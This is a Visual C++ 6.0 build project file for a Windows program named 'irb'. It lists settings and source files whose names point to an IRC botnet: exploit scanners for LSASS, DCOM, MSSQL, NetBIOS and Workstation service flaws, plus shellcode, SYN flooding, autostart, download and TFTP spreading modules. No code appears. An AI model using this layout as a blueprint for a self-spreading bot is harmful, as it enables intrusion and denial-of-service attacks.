# Microsoft Developer Studio Project File - Name="irb" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=irb - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "irb.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "irb.mak" CFG="irb - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "irb - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 user32.lib /nologo /subsystem:windows /incremental:yes /map /debug /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "irb - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "scanners"

# PROP Default_Filter "cpp"
# Begin Source File

SOURCE=.\clsass.cpp
# End Source File
# Begin Source File

SOURCE=.\dcass.cpp
# End Source File
# Begin Source File

SOURCE=.\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\lsass1lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\mssqllsass.cpp
# End Source File
# Begin Source File

SOURCE=.\ndcass.cpp
# End Source File
# Begin Source File

SOURCE=.\netbios.cpp
# End Source File
# Begin Source File

SOURCE=.\wksmass.cpp
# End Source File
# Begin Source File

SOURCE=.\wkssvc.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\httpd.cpp
# End Source File
# Begin Source File

SOURCE=.\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\irb.cpp
# End Source File
# Begin Source File

SOURCE=.\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\net.cpp
# End Source File
# Begin Source File

SOURCE=.\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\random.cpp
# End Source File
# Begin Source File

SOURCE=.\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\session.cpp
# End Source File
# Begin Source File

SOURCE=.\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\tftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\visit.cpp
# End Source File
# Begin Source File

SOURCE=.\wildcard.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "config"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\configs.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\autostart.h
# End Source File
# Begin Source File

SOURCE=.\clsass.h
# End Source File
# Begin Source File

SOURCE=.\crc32.h
# End Source File
# Begin Source File

SOURCE=.\crypt.h
# End Source File
# Begin Source File

SOURCE=.\dcass.h
# End Source File
# Begin Source File

SOURCE=.\dcom.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\externs.h
# End Source File
# Begin Source File

SOURCE=.\fphost.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\functions.h
# End Source File
# Begin Source File

SOURCE=.\globals.h
# End Source File
# Begin Source File

SOURCE=.\httpd.h
# End Source File
# Begin Source File

SOURCE=.\ident.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\irb.h
# End Source File
# Begin Source File

SOURCE=.\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\lsass.h
# End Source File
# Begin Source File

SOURCE=.\lsass1lsass.h
# End Source File
# Begin Source File

SOURCE=.\misc.h
# End Source File
# Begin Source File

SOURCE=.\mssql.h
# End Source File
# Begin Source File

SOURCE=.\mssqllsass.h
# End Source File
# Begin Source File

SOURCE=.\ndcass.h
# End Source File
# Begin Source File

SOURCE=.\net.h
# End Source File
# Begin Source File

SOURCE=.\netutils.h
# End Source File
# Begin Source File

SOURCE=.\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\passwd.h
# End Source File
# Begin Source File

SOURCE=.\processes.h
# End Source File
# Begin Source File

SOURCE=.\random.h
# End Source File
# Begin Source File

SOURCE=.\redirect.h
# End Source File
# Begin Source File

SOURCE=.\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\scan.h
# End Source File
# Begin Source File

SOURCE=.\secure.h
# End Source File
# Begin Source File

SOURCE=.\session.h
# End Source File
# Begin Source File

SOURCE=.\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\synflood.h
# End Source File
# Begin Source File

SOURCE=.\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\visit.h
# End Source File
# Begin Source File

SOURCE=.\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\wksmass.h
# End Source File
# Begin Source File

SOURCE=.\wkssvc.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
